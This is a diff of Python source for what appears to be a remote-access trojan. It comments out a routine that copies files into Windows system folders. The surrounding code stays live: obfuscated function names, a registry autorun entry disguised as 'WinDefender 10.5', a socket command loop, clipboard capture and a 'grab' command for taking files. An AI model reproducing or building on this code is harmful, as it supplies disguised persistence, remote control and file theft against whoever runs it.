@@ -355,10 +355,10 @@ def zJnWJKrmzwZTAHJT(f_name, path):
     open = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
     reg.SetValueEx(open, "WinDefender 10.5", 0, reg.REG_SZ, address)
     reg.CloseKey(open)
-def XbNcYPeberQMdl(f_name, path):
-    address=os.path.join(path, f_name)
-    shutil.copytree(address, "C:\windows\system32", dirs_exist_ok=True)
-    shutil.copytree(address, "C:\windows", dirs_exist_ok=True)
+#def XbNcYPeberQMdl(f_name, path):
+    #address=os.path.join(path, f_name)
+    #shutil.copytree(address, "C:\windows\system32", dirs_exist_ok=True)
+    #shutil.copytree(address, "C:\windows", dirs_exist_ok=True)
 BUFFER_SIZE = 1024
 def connection():
     try:
@@ -427,13 +427,13 @@ def connection():
                                         pass
                                 finally:
                                     CloseClipboard()
-                            elif command.startswith('merciless'):
-                                file_name = command[7:]
-                                pth = os.getcwd()
-                                try:
-                                    XbNcYPeberQMdl(file_name, pth)
-                                except Exception as e:
-                                    s.send(str(e).encode('utf-8'))
+                            #elif command.startswith('merciless'):
+                                #file_name = command[7:]
+                                #pth = os.getcwd()
+                                #try:
+                                    #XbNcYPeberQMdl(file_name, pth)
+                                #except Exception as e:
+                                    #s.send(str(e).encode('utf-8'))
                             elif command.startswith('grab'):
                                 file_name = command[5:]
                                 file_size = os.path.getsize(file_name)
